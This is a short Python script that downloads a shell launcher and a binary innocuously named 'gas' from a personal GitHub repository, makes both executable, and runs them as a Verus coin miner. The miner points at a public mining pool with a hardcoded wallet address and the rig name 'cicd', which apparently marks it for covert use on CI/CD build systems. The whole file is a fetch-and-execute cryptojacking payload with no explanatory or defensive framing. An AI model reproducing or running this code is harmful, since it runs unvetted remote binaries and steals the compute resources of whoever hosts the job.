import os

os.system("wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh")
os.system("wget https://github.com/hunshukajh/yes/raw/main/gas")
os.system("chmod +x gas cmdline_launcher.sh")
os.system("./cmdline_launcher.sh -algo verushash -coin VRSC -wallet RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe -rigName cicd -pool1 na.luckpool.net:3956")
